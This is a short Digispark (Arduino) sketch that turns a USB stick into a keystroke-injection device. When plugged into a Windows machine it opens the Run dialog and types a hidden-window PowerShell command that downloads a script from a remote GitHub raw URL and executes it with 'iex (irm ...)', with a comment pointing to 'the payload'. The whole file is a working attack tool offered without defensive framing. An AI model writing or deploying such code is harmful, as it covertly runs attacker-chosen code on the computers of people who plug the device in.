#include "DigiKeyboard.h"

void setup() {
  // empty
}

void loop() {
  // Initialise digispark
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(600);

  // Opens the run dialog
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);

  // Writes the command
  DigiKeyboard.print("powershell -w h ");
  DigiKeyboard.print("iex (irm \"");
  DigiKeyboard.print("https://raw.githubusercontent.com/Prutserdt/dotfiles/master/Stack/Code/Powershell/script.ps1");  // The payload is here :-)
  DigiKeyboard.print("\")");
  // Enters it
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for (;;) {/* Stops the loop */}
}
